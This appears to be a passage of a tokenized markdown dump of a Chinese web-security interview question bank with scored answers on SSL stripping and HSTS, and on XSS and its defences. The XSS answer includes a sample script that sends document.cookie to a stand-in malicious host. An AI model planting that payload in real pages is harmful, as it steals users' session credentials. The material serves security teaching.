级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。\\n- **:2** 过程:","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。\\n","task":false,"loose":false,"text":"**:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。","tokens":[{"type":"text","raw":"**:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。","text":"**:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。","text":" 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。","escaped":false}]}]},{"type":"list_item","raw":"- **:2** 过程:","task":false,"loose":false,"text":"**:2** 过程:","tokens":[{"type":"text","raw":"**:2** 过程:","text":"**:2** 过程:","tokens":[{"type":"strong","raw":"**:2**","text":":2","tokens":[{"type":"text","raw":":2","text":":2","escaped":false}]},{"type":"text","raw":" 过程:","text":" 过程:","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；  \\n >2、随后浏览器向服务器发起 http 通信;  \\n >3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  ","tokens":[{"type":"paragraph","raw":"1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；  \\n2、随后浏览器向服务器发起 http 通信;  \\n3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  ","text":"1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；  \\n2、随后浏览器向服务器发起 http 通信;  \\n3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  ","tokens":[{"type":"text","raw":"1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；","text":"1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"2、随后浏览器向服务器发起 http 通信;","text":"2、随后浏览器向服务器发起 http 通信;","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  ","text":"3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  ","escaped":false}]}],"text":"1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；  \\n2、随后浏览器向服务器发起 http 通信;  \\n3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  "},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **:1** 防御：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** 防御：","task":false,"loose":false,"text":"**:1** 防御：","tokens":[{"type":"text","raw":"**:1** 防御：","text":"**:1** 防御：","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。","tokens":[{"type":"paragraph","raw":"使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。","text":"使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。","tokens":[{"type":"text","raw":"使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。","text":"使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。","escaped":false}]}],"text":"使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是跨站脚本攻击（XSS）？如何防范？\\n\\n","depth":2,"text":"什么是跨站脚本攻击（XSS）？如何防范？","tokens":[{"type":"text","raw":"什么是跨站脚本攻击（XSS）？如何防范？","text":"什么是跨站脚本攻击（XSS）？如何防范？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（9 分）\\n\\n","depth":4,"text":"解答（9 分）","tokens":[{"type":"text","raw":"解答（9 分）","text":"解答（9 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站`（http://malicious - site.com）`。\\n\\n- **1：** 输入验证和过滤：<br/>\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。\\n- **2：** 输出编码：<br/>\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。\\n- **2：** 内容安全策略（CSP）：<br/>\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如`<script>alert(\'XSS\');<\/script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。\\n- **2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站`（http://malicious - site.com）`。\\n\\n","task":false,"loose":true,"text":"**2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站`（http://malicious - site.com）`。\\n","tokens":[{"type":"text","raw":"**2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n\\n`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`。当其他用户访问包含这条评论\\n\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n\\n网站`（http://malicious - site.com）`。\\n","text":"**2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站`（http://malicious - site.com）`。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n","text":" 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n","escaped":false},{"type":"codespan","raw":"`<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>`","text":"<script>document.location = \'http://malicious - site.com?cookie=\' + document.cookie<\/script>"},{"type":"text","raw":"。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站","text":"。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站","escaped":false},{"type":"codespan","raw":"`（http://malicious - site.com）`","text":"（http://malicious - site.com）"},{"type":"text","raw":"。","text":"。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 输入验证和过滤：<br/>\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。\\n","task":false,"loose":true,"text":"**1：** 输入验证和过滤：<br/>\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。","tokens":[{"type":"text","raw":"**1：** 输入验证和过滤：<br/>\\n\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。","text":"**1：** 输入验证和过滤：<br/>\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 输入验证和过滤：","text":" 输入验证和过滤：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。","text":"\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、\\"、\'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 输出编码：<br/>\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。\\n","task":false,"loose":true,"text":"**2：** 输出编码：<br/>\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。","tokens":[{"type":"text","raw":"**2：** 输出编码：<br/>\\n\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n\\n用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。","text":"**2：** 输出编码：<br/>\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 输出编码：","text":" 输出编码：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，","text":"\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，","escaped":false},{"type":"codespan","raw":"`将<转义为&lt;，>转义为&gt;`","text":"将<转义为&lt;，>转义为&gt;"},{"type":"text","raw":"。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。","text":"。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 内容安全策略（CSP）：<br/>\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如`<script>alert(\'XSS\');<\/script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。\\n","task":false,"loose":true,"text":"**2：** 内容安全策略（CSP）：<br/>\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如`<script>alert(\'XSS\');<\/script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。","tokens":[{"type":"text","raw":"**2：** 内容安全策略（CSP）：<br/>\\n\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n\\n置`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网\\n\\n站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>\\n\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\n\\nHTML 标签中的脚本，如`<script>alert(\'XSS\');<\/script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n\\n攻击者可能会利用它来执行恶意代码。","text":"**2：** 内容安全策略（CSP）：<br/>\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如`<script>alert(\'XSS\');<\/script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 内容安全策略（CSP）：","text":" 内容安全策略（CSP）：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置","text":"\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置","escaped":false},{"type":"codespan","raw":"`Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com`","text":"Content-Security-Policy: default- src\'self\'; script-src\'self\' https://trusted-scripts.com"},{"type":"text","raw":"。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和","text":"。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和","escaped":false},{"type":"codespan","raw":"`https://trusted - scripts.com`","text":"https://trusted - scripts.com"},{"type":"text","raw":"。这样可以防止外部恶意脚本的注入。","text":"。这样可以防止外部恶意脚本的注入。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如","text":"\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为\'nonce-value\'或\'hash-value\'来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如","escaped":false},{"type":"codespan","raw":"`<script>alert(\'XSS\');<\/script>`","text":"<script>alert(\'XSS\');<\/script>"},{"type":"text","raw":"，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。","text":"，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。","task":false,"loose":true,"text":"**2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。","tokens":[{"type":"text","raw":"**2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 